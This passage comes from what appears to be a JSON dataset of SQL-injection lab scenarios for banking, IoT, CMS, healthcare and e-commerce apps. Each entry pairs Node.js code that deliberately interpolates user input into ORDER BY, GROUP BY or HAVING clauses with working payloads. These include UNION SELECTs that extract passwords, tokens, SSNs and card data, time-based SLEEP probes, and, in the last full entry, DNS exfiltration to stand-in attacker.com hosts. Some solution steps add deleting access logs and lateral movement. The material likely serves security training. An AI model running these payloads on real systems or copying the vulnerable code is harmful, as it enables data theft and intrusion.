    "Solution Steps": [
      "Intercept sort functionality using Burp Suite",
      "Inject invalid ORDER BY clauses to trigger errors",
      "Use Boolean-based payloads to confirm vulnerability",
      "Deploy UNION SELECTs to enumerate database tables",
      "Extract privileged account details for admin access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions/sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(400).send('SQL Injection: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "amount--",
      "1 UNION SELECT username, password FROM users--",
      "id OR 1=1--",
      "1 ORDER BY 1000--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard's device analytics feature groups device status reports without proper sanitization of user input. Attackers can exploit this to perform GROUP BY SQL injection. To solve: Extract hidden device metadata by leveraging GROUP BY clause injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept group analytics requests",
      "Fuzz group field to cause SQL errors",
      "Confirm injection via Boolean-based techniques",
      "Craft UNION queries to leak metadata fields",
      "Collect leaked firmware version, OS info, and device IDs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics/group', (req, res) => {\n  const groupField = req.query.group;\n  const sql = `SELECT COUNT(*), ${groupField} FROM status_reports GROUP BY ${groupField}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "device_type--",
      "1 UNION SELECT firmware_version, NULL FROM device_metadata--",
      "1 OR 1=1--",
      "device_id UNION SELECT user, password FROM admin_users--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in ORDER BY Clause",
    "Lab Description": "A CMS allows users to sort blog posts based on custom input without input validation, leading to ORDER BY clause SQL injection. To solve: Exploit the injection to retrieve hidden administrative user accounts and related login details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept CMS post sorting with Postman",
      "Inject random inputs into the sort parameter",
      "Confirm ORDER BY vulnerability with errors",
      "Use UNION SELECT payloads to retrieve usernames and passwords",
      "Login as admin using leaked credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/posts/sort', (req, res) => {\n  const sortBy = req.query.sort;\n  const sql = `SELECT * FROM posts ORDER BY ${sortBy}`;\n  db.query(sql, (err, posts) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(posts);\n  });\n});",
    "payloads": [
      "title--",
      "1 UNION SELECT username, password FROM admin_users--",
      "created_at OR 1=1--",
      "id UNION SELECT NULL, NULL FROM dual--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "An API Gateway aggregates event statistics and allows filtering using vulnerable HAVING clauses. Lack of input sanitization exposes SQL injection opportunities. To solve: Leak internal access tokens stored in hidden tables by manipulating HAVING filters.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap to automate HAVING clause injection detection",
      "Confirm vulnerability by sending time-based payloads",
      "Craft UNION queries to retrieve token information",
      "Extract and reuse leaked tokens to access protected APIs",
      "Obfuscate exploit trail by deleting access logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/events/aggregate', (req, res) => {\n  const threshold = req.query.threshold;\n  const sql = `SELECT COUNT(*), event_type FROM events GROUP BY event_type HAVING COUNT(*) > ${threshold}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('SQL Issue: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "10 OR 1=1--",
      "5 UNION SELECT token, NULL FROM access_tokens--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "1 UNION SELECT username,password FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT platform sorts device logs based on client input, but input is directly embedded in ORDER BY clauses. Lack of validation results in SQL injection vulnerability. To solve: Exfiltrate network credentials by exploiting sorting functionality.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept sorting API calls via OWASP ZAP",
      "Send malformed ORDER BY values and observe errors",
      "Confirm injection point with Boolean-based payloads",
      "Use UNION SELECT to retrieve Wi-Fi credentials",
      "Access devices using extracted network credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/logs/sort', (req, res) => {\n  const sortField = req.query.sort;\n  const sql = `SELECT * FROM device_logs ORDER BY ${sortField}`;\n  db.query(sql, (err, logs) => {\n    if (err) res.status(400).send('Database Error: ' + err.sqlMessage);\n    else res.json(logs);\n  });\n});",
    "payloads": [
      "timestamp--",
      "1 UNION SELECT ssid,password FROM wifi_credentials--",
      "device_id OR 1=1--",
      "location UNION SELECT NULL,NULL FROM dual--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal allows customers to sort transaction history based on URL parameters directly inserted into an ORDER BY clause. The input is not sanitized or whitelisted, exposing a SQL injection vector. Attackers can manipulate the sort parameter to trigger database errors, enumerate columns, and eventually retrieve sensitive information such as admin account credentials. To solve: Perform ORDER BY-based SQL injection to leak database structure and extract privileged user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the sort request using Burp Suite Proxy",
      "Inject invalid field names into sort parameter to induce SQL errors",
      "Use Boolean-based payloads to confirm field injection vulnerability",
      "Craft UNION SELECT statements to enumerate columns and retrieve credentials",
      "Login using leaked admin account credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions/sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(400).send('SQL Injection: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "amount--",
      "1 UNION SELECT username, password FROM users--",
      "id OR 1=1--",
      "1 ORDER BY 9999--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT monitoring dashboard aggregates device statistics, allowing dynamic grouping via user-controlled parameters. Improper handling of input within the GROUP BY clause allows injection attacks. By manipulating the group parameter, attackers can leak internal database structure related to devices, such as firmware versions and OS metadata. To solve: Perform GROUP BY SQL injection to reveal hidden attributes of connected IoT devices.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the analytics grouping request",
      "Submit malformed group parameters to trigger SQL errors",
      "Validate injection via Boolean-based behavior differences",
      "Inject UNION SELECT payloads to extract device metadata fields",
      "Aggregate extracted firmware version and device OS information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics/group', (req, res) => {\n  const groupField = req.query.group;\n  const sql = `SELECT COUNT(*), ${groupField} FROM status_reports GROUP BY ${groupField}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "device_type--",
      "1 UNION SELECT firmware_version, NULL FROM device_metadata--",
      "1 OR 1=1--",
      "device_id UNION SELECT user, password FROM admin_users--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in ORDER BY Clause",
    "Lab Description": "A Content Management System (CMS) platform provides blog sorting features where the sort parameter is concatenated directly into an SQL ORDER BY clause. No input validation or allowlisting is performed. Exploiting this, attackers can craft ORDER BY injection payloads to enumerate sensitive database tables and retrieve admin user login information. To solve: Manipulate the sort parameter to leak user data via UNION-based injection.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to modify blog post sorting requests",
      "Inject arbitrary strings into the sort parameter to generate database errors",
      "Identify the injection point through error analysis",
      "Craft UNION SELECT payloads to retrieve administrative usernames and passwords",
      "Authenticate into the admin dashboard with extracted credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/posts/sort', (req, res) => {\n  const sortBy = req.query.sort;\n  const sql = `SELECT * FROM posts ORDER BY ${sortBy}`;\n  db.query(sql, (err, posts) => {\n    if (err) res.status(500).send('Error: ' + err.sqlMessage);\n    else res.json(posts);\n  });\n});",
    "payloads": [
      "title--",
      "1 UNION SELECT username, password FROM admin_users--",
      "created_at OR 1=1--",
      "id UNION SELECT NULL, NULL FROM dual--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in HAVING Clause",
    "Lab Description": "The API Gateway's event aggregation endpoint filters event data using user-controlled thresholds embedded into a HAVING clause. No input sanitization exists, exposing a SQL injection path. Attackers can inject into the HAVING condition to execute arbitrary queries, bypass authentication layers, and extract OAuth tokens. To solve: Exploit the HAVING clause to leak sensitive access tokens and elevate API privileges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Run sqlmap targeting the event threshold filter",
      "Detect HAVING clause injection via Boolean- and time-based payloads",
      "Craft UNION-based payloads to enumerate hidden tables",
      "Extract access tokens stored in backend databases",
      "Use extracted tokens to gain access to restricted API endpoints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/events/aggregate', (req, res) => {\n  const threshold = req.query.threshold;\n  const sql = `SELECT COUNT(*), event_type FROM events GROUP BY event_type HAVING COUNT(*) > ${threshold}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('SQL Issue: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "10 OR 1=1--",
      "5 UNION SELECT token, NULL FROM access_tokens--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "1 UNION SELECT username,password FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows sorting of device logs based on user-supplied parameters, which are directly embedded in the ORDER BY clause without validation. Attackers can inject malicious input to manipulate the sorting SQL query, leading to exfiltration of Wi-Fi credentials and device secrets. To solve: Craft ORDER BY clause payloads that leak device network credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept API sorting requests using OWASP ZAP",
      "Send malformed sort parameters to cause backend SQL parsing errors",
      "Confirm vulnerability using Boolean-based injections",
      "Exploit using UNION SELECT payloads to dump Wi-Fi SSID and password fields",
      "Access device networks with recovered credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/logs/sort', (req, res) => {\n  const sortField = req.query.sort;\n  const sql = `SELECT * FROM device_logs ORDER BY ${sortField}`;\n  db.query(sql, (err, logs) => {\n    if (err) res.status(400).send('Database Error: ' + err.sqlMessage);\n    else res.json(logs);\n  });\n});",
    "payloads": [
      "timestamp--",
      "1 UNION SELECT ssid,password FROM wifi_credentials--",
      "device_id OR 1=1--",
      "location UNION SELECT NULL,NULL FROM dual--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal's fraud analytics endpoint groups transactions and applies user-defined filters via a HAVING clause. Inputs are directly interpolated into the SQL query, enabling injection. Attackers can inject logical operations and delay functions (e.g., SLEEP()) to perform blind inference attacks. MySQL-specific error messages (e.g., 'Operand should contain 1 column(s)') provide hints during exploitation. To solve: Perform blind SQLi exploiting the HAVING filter to extract account balances and manipulate risk scoring.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept fraud analytics API call using Burp Suite",
      "Submit malformed threshold values and analyze error responses",
      "Validate SQLi via time-based injections (e.g., SLEEP(5))",
      "Craft UNION SELECT payloads to extract account balances",
      "Manipulate extracted balances to bypass fraud detection thresholds"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/fraud/risk', (req, res) => {\n  const amount = req.query.amount;\n  const query = `SELECT account_id, SUM(amount) FROM transactions GROUP BY account_id HAVING SUM(amount) > ${amount}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(400).send('Fraud Analysis Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "100 OR 1=1--",
      "1 HAVING 1=1 AND SLEEP(5)--",
      "0 UNION SELECT username, password FROM users--",
      "10 OR EXISTS(SELECT * FROM information_schema.tables)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard groups smart sensor data based on user-supplied fields without input validation, interpolated into a GROUP BY clause. Improper handling leads to injection risks allowing attackers to extract sensitive device configurations. Specific error messages like 'Unknown column' can help in blind enumeration. To solve: Manipulate group parameters to dump Wi-Fi SSID and secret keys stored in the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept sensor grouping requests",
      "Inject invalid group fields and observe server error feedback",
      "Validate using UNION SELECT payloads to enumerate available columns",
      "Craft payloads to extract device Wi-Fi credentials",
      "Access IoT device management interfaces using stolen secrets"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/sensors/group', (req, res) => {\n  const groupField = req.query.group;\n  const sql = `SELECT ${groupField}, COUNT(*) FROM sensor_data GROUP BY ${groupField}`;\n  db.query(sql, (err, records) => {\n    if (err) res.status(500).send('Sensor Grouping Error: ' + err.sqlMessage);\n    else res.json(records);\n  });\n});",
    "payloads": [
      "location--",
      "device_id UNION SELECT ssid,password FROM wifi_data--",
      "id OR 1=1--",
      "device_type HAVING 1=1--"
    ]
  },
  {
    "Lab scenario": "CMS Platform SQL Injection in HAVING Clause",
    "Lab Description": "The CMS platform's content ranking system uses a vulnerable HAVING clause to filter blog posts by popularity scores. User input is embedded without validation. Exploiting the input, attackers can inject subqueries and sleep functions to escalate into blind SQL injection. The backend MySQL server leaks syntax errors, aiding payload refinement. To solve: Execute HAVING clause injections to extract administrator session tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST request updating blog scores using Burp Suite",
      "Submit numeric filters with appended SQL logic to provoke errors",
      "Validate the HAVING injection point through time-based payloads",
      "Inject UNION SELECT payloads to leak admin session tokens",
      "Login to admin panel using hijacked session token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.post('/content/rank', (req, res) => {\n  const score = req.body.score;\n  const sql = `SELECT title, COUNT(*) FROM posts GROUP BY title HAVING AVG(score) > ${score}`;\n  db.query(sql, (err, posts) => {\n    if (err) res.status(500).send('Ranking Error: ' + err.sqlMessage);\n    else res.json(posts);\n  });\n});",
    "payloads": [
      "5 HAVING 1=1--",
      "0 UNION SELECT session_token, NULL FROM admin_sessions--",
      "1 HAVING SLEEP(5)--",
      "10 OR EXISTS(SELECT 1)--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API gateway allows clients to sort API responses dynamically based on query parameters directly embedded in ORDER BY clauses. Absence of sanitization introduces SQL injection vulnerabilities. Attackers can manipulate sort fields to execute arbitrary queries and extract hidden customer metadata. Specific behaviors like MySQL's 'You have an error in your SQL syntax' aid in payload tuning. To solve: Perform ORDER BY SQLi to dump client records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to fuzz API sorting parameters",
      "Inject invalid field names to trigger SQL syntax errors",
      "Craft Boolean-based and UNION-based payloads",
      "Extract client email addresses and billing information",
      "Authenticate into hidden premium customer portals"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/clients/sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM clients ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(400).send('API Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "email--",
      "1 UNION SELECT email, password FROM users--",
      "created_at OR 1=1--",
      "id HAVING 1=1--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal groups customer transactions by custom-defined fields without input validation. The GROUP BY clause is dynamically assembled from client-side inputs. Malformed inputs result in MySQL-specific 'Unknown column' errors. Attackers can exploit this to inject UNION queries and retrieve sensitive customer transaction logs. To solve: Abuse the group parameter to exfiltrate bank account activity.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture transaction grouping API using Burp Suite",
      "Inject non-existent fields to trigger database error responses",
      "Confirm GROUP BY SQLi by injecting Boolean-based payloads",
      "Use UNION SELECT to extract transaction amounts and timestamps",
      "Analyze stolen data for financial reconnaissance"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/banking/transactions/group', (req, res) => {\n  const field = req.query.field;\n  const sql = `SELECT ${field}, SUM(amount) FROM transactions GROUP BY ${field}`;\n  db.query(sql, (err, data) => {\n    if (err) res.status(500).send('Transaction Error: ' + err.sqlMessage);\n    else res.json(data);\n  });\n});",
    "payloads": [
      "transaction_type--",
      "1 UNION SELECT account_number, balance FROM accounts--",
      "1 HAVING 1=1--",
      "date OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Healthcare App SQL Injection via HAVING Clause (PostgreSQL)",
    "Lab Description": "The healthcare platform's patient analytics module aggregates medical test results. A user-supplied severity score is passed into a vulnerable HAVING clause without input validation. In PostgreSQL, error messages like 'column must appear in the GROUP BY clause' leak useful information. Attackers can exploit this flaw to enumerate patients and exfiltrate health record identifiers. To solve: Exploit HAVING clause injection to dump patient IDs.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture lab result aggregation requests in Burp Suite",
      "Inject invalid HAVING conditions to trigger PostgreSQL error messages",
      "Confirm blind SQLi via time-based injections (e.g., pg_sleep(5))",
      "Inject UNION SELECT payloads to extract patient identifiers",
      "Access protected health data using stolen patient IDs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/analytics/patient', (req, res) => {\n  const severity = req.body.severity;\n  const sql = `SELECT patient_id, COUNT(*) FROM test_results GROUP BY patient_id HAVING AVG(severity) > ${severity}`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Analytics Error: ' + err.message);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "5 OR 1=1--",
      "0 UNION SELECT patient_name, ssn FROM patients--",
      "1 HAVING pg_sleep(5)--",
      "10 OR EXISTS(SELECT 1)--"
    ]
  },
  {
    "Lab scenario": "E-commerce Site SQL Injection in ORDER BY Clause (Microsoft SQL Server)",
    "Lab Description": "The e-commerce site's product catalog allows users to sort by dynamic fields passed directly into an ORDER BY clause. Due to lack of sanitization, Microsoft SQL Server-specific error messages like 'Incorrect syntax near' leak query structure. Attackers can inject ORDER BY payloads to manipulate query flow and steal credit card tokens. To solve: Abuse ORDER BY injection to leak sensitive customer payment info.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to fuzz the sort parameter",
      "Trigger SQL Server-specific syntax errors",
      "Validate SQLi through error-based payloads",
      "Craft UNION SELECTs to extract credit card tokens",
      "Access user wallets by reusing leaked payment tokens"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/products/list', (req, res) => {\n  const sortBy = req.query.sort;\n  const query = `SELECT * FROM products ORDER BY ${sortBy}`;\n  db.query(query, (err, products) => {\n    if (err) res.status(400).send('Product List Error: ' + err.message);\n    else res.json(products);\n  });\n});",
    "payloads": [
      "price--",
      "1 UNION SELECT card_number, cvv FROM payments--",
      "created_at; WAITFOR DELAY '00:00:05'--",
      "id OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Cloud File Storage SQL Injection in GROUP BY Clause",
    "Lab Description": "The cloud storage system categorizes uploaded files by metadata such as file type or owner ID. The field parameter is inserted into the GROUP BY clause without sanitization. Attackers can perform injections, exploiting MySQL 'Unknown column' errors for blind enumeration. To solve: Exploit GROUP BY SQL injection to retrieve file owner identities.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture group-by requests via file search filters",
      "Inject invalid fields to observe MySQL error messages",
      "Confirm SQLi by time-based injections or Boolean logic",
      "Extract usernames and owner IDs via UNION queries",
      "Access private storage spaces using extracted owner credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/storage/files/group', (req, res) => {\n  const group = req.query.group;\n  const sql = `SELECT ${group}, COUNT(*) FROM files GROUP BY ${group}`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Storage Error: ' + err.sqlMessage);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "file_type--",
      "1 UNION SELECT username, email FROM users--",
      "owner_id OR 1=1--",
      "size HAVING 1=1--"
    ]
  },
  {
    "Lab scenario": "Financial API SQL Injection in HAVING Clause (PostgreSQL)",
    "Lab Description": "The financial platform's reporting API filters transactions by user-defined conditions embedded into a HAVING clause. PostgreSQL-specific 'division by zero' errors leak backend behavior when malformed inputs are injected. Attackers can use this flaw to enumerate transaction metadata. To solve: Exploit HAVING clause SQLi to leak customer account details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture financial report API calls via proxy",
      "Submit invalid division expressions (e.g., 1/0) to trigger PostgreSQL error leaks",
      "Confirm SQLi with time-based payloads using pg_sleep()",
      "Use UNION SELECT to extract customer account balances",
      "Pivot to administrative API access via leaked credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/api/reports', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT account_id, SUM(amount) FROM transactions GROUP BY account_id HAVING SUM(amount) > ${filter}`;\n  db.query(query, (err, report) => {\n    if (err) res.status(400).send('Report Error: ' + err.message);\n    else res.json(report);\n  });\n});",
    "payloads": [
      "100 OR 1=1--",
      "0 UNION SELECT account_number, routing_number FROM accounts--",
      "1 HAVING pg_sleep(5)--",
      "5/0--"
    ]
  },
  {
    "Lab scenario": "CRM System SQL Injection in ORDER BY Clause",
    "Lab Description": "The CRM system's client management module allows dynamic sorting by passing user-controlled fields into ORDER BY without validation. Attackers exploit this by injecting malicious field names, using MySQL-specific error behaviors to tune payloads. To solve: Inject ORDER BY SQLi to exfiltrate sensitive client contact information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Fuzz CRM sorting fields using Postman",
      "Identify SQL errors hinting at malformed field references",
      "Validate SQL injection by exploiting error or Boolean-based payloads",
      "Craft UNION-based injections to leak client phone numbers and emails",
      "Use stolen contact information for social engineering attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/crm/clients/sort', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM clients ORDER BY ${sort}`;\n  db.query(query, (err, clients) => {\n    if (err) res.status(400).send('CRM Error: ' + err.sqlMessage);\n    else res.json(clients);\n  });\n});",
    "payloads": [
      "name--",
      "id UNION SELECT phone, email FROM clients--",
      "created_at HAVING 1=1--",
      "1 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "IoT Device Dashboard SQL Injection via ORDER BY in API Query",
    "Lab Description": "The IoT management dashboard exposes a RESTful API for listing devices. The 'sort' parameter is directly injected into an ORDER BY clause. Lack of filtering allows attackers to inject malicious SQL segments. Combined with verbose MySQL errors, this enables pivoting from blind injections to credential leakage. To solve: Perform ORDER BY injection, leak device credentials, and gain dashboard access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept device listing API calls",
      "Fuzz the 'sort' parameter with invalid fields to generate SQL errors",
      "Confirm injection via Boolean-based or time-based payloads",
      "Craft UNION SELECT to extract admin username/password hashes",
      "Login using stolen credentials to access privileged dashboard functions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/api/devices', (req, res) => {\n  const sort = req.query.sort;\n  const sql = `SELECT id, device_name FROM devices ORDER BY ${sort}`;\n  db.query(sql, (err, rows) => {\n    if (err) res.status(500).send('Device Error: ' + err.message);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "device_name--",
      "1 UNION SELECT username, password FROM users--",
      "id OR 1=1--",
      "status HAVING 1=1--"
    ]
  },
  {
    "Lab scenario": "GraphQL API SQL Injection via Field Resolver (MySQL)",
    "Lab Description": "The GraphQL backend resolves user-provided fields in a dynamic query without sanitization. Attackers can inject SQL fragments through crafted GraphQL queries, pivoting from blind inference to full UNION SELECT extractions. To solve: Inject into GraphQL resolver, leak email addresses from the users table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL introspection queries to find vulnerable fields",
      "Craft malicious field names or parameters in GraphQL queries",
      "Confirm injection using time-based techniques (e.g., SLEEP(5))",
      "Use UNION SELECT to extract emails and full user profiles",
      "Pivot to gaining administrative access using leaked information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    user: (parent, args, context, info) => {\n      const field = args.field;\n      const query = `SELECT * FROM users ORDER BY ${field}`;\n      return db.query(query);\n    }\n  }\n};",
    "payloads": [
      "{ user(field: \"email\") { id name } }",
      "{ user(field: \"1 UNION SELECT username, password FROM users--\") { id name } }",
      "{ user(field: \"created_at; SLEEP(5)--\") { id name } }",
      "{ user(field: \"id HAVING 1=1\") { id name } }"
    ]
  },
  {
    "Lab scenario": "Banking API SOAP Request SQL Injection via Group Filtering",
    "Lab Description": "The banking web service exposes SOAP APIs for batch transaction analysis. User-defined filters are passed into GROUP BY clauses without sanitization, leading to blind SQLi possibilities. SOAPFault error responses reveal back-end structure during failed injections. To solve: Inject into SOAP filter, enumerate account balances.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to inspect and manipulate SOAP XML payloads",
      "Inject invalid fields into filter elements to trigger SOAPFault errors",
      "Confirm SQL injection by inducing slow responses (e.g., SLEEP payloads)",
      "Craft UNION-based payloads in SOAP body to exfiltrate balance data",
      "Reconstruct full customer profile data based on account leakage"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "soapServer.on('listTransactions', function(args, callback) {\n  const groupBy = args.groupBy;\n  const sql = `SELECT account_id, SUM(amount) FROM transactions GROUP BY ${groupBy}`;\n  db.query(sql, (err, res) => {\n    if (err) callback({ faultstring: 'Transaction Error: ' + err.message });\n    else callback(null, res);\n  });\n});",
    "payloads": [
      "<groupBy>account_id</groupBy>",
      "<groupBy>1 UNION SELECT username,password FROM accounts--</groupBy>",
      "<groupBy>amount HAVING SLEEP(5)--</groupBy>",
      "<groupBy>balance OR 1=1--</groupBy>"
    ]
  },
  {
    "Lab scenario": "Smart Home API SQL Injection via HAVING Clause Enumeration",
    "Lab Description": "The smart home API uses a user-controlled threshold parameter inside a HAVING clause to filter device activity logs. No input validation allows attackers to exploit HAVING-based blind SQL injection using delayed responses and error leaks. To solve: Extract internal device network IDs through time-based inference.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture smart home device API traffic in Burp Suite",
      "Submit logical payloads causing server-side delays (e.g., SLEEP)",
      "Confirm SQLi by correlating response times with crafted payloads",
      "Use Boolean logic to infer valid internal network identifiers",
      "Exfiltrate network layout information for lateral movement attacks"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/api/devices/activity', (req, res) => {\n  const threshold = req.query.threshold;\n  const query = `SELECT device_id, COUNT(*) FROM logs GROUP BY device_id HAVING COUNT(*) > ${threshold}`;\n  db.query(query, (err, rows) => {\n    if (err) res.status(400).send('Activity Error: ' + err.message);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "10 OR 1=1--",
      "0 UNION SELECT device_name, network_id FROM devices--",
      "1 HAVING SLEEP(5)--",
      "5/0--"
    ]
  },
  {
    "Lab scenario": "CMS Search Feature SQL Injection in ORDER BY Field",
    "Lab Description": "A popular CMS allows users to sort blog posts dynamically. The 'order' field is inserted unsafely into an ORDER BY clause, leading to direct SQL injection. Attackers exploit this to dump administrator credentials and perform privilege escalation. To solve: Exploit ORDER BY SQLi to steal CMS administrator passwords.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept blog post sort requests",
      "Manipulate 'order' parameter with SQL payloads to generate MySQL errors",
      "Confirm SQL injection by triggering controlled server behavior",
      "Perform UNION SELECT to extract admin usernames and password hashes",
      "Login as admin and escalate privileges within the CMS"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/cms/search', (req, res) => {\n  const order = req.query.order;\n  const query = `SELECT title, content FROM posts ORDER BY ${order}`;\n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Search Error: ' + err.sqlMessage);\n    else res.json(results);\n  });\n});",
    "payloads": [
      "title--",
      "1 UNION SELECT username, password FROM admins--",
      "published_date HAVING 1=1--",
      "id OR 1=1--"
    ]
  },
  {
    "Lab scenario": "IoT Device Management API - Basic OOB SQL Injection via Device Name",
    "Lab Description": "The IoT device registration API fails to sanitize the device name parameter before interpolating it into an SQL INSERT query. An attacker can perform Out-of-Band (OOB) SQL Injection by forcing the server to make DNS lookups to leak sensitive information like database usernames. Solve this lab by exfiltrating the database user through a DNS-based OOB payload.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB capture service (Burp Collaborator, interact.sh).",
      "Submit a device registration request with a crafted payload causing a DNS lookup.",
      "Monitor DNS interactions and retrieve the database user information.",
      "Confirm successful exfiltration to complete the lab."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/devices', (req, res) => {\n  const name = req.body.name;\n  const sql = `INSERT INTO devices (name) VALUES ('${name}')`;\n  db.query(sql, (err) => {\n    if (err) res.status(500).send('Device registration failed');\n    else res.send('Device registered successfully');\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.oob.attacker.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\leak'--"
    ]
  },
  {
    "Lab scenario": "E-commerce Platform OAuth - Token Introspection OOB SQL Injection",
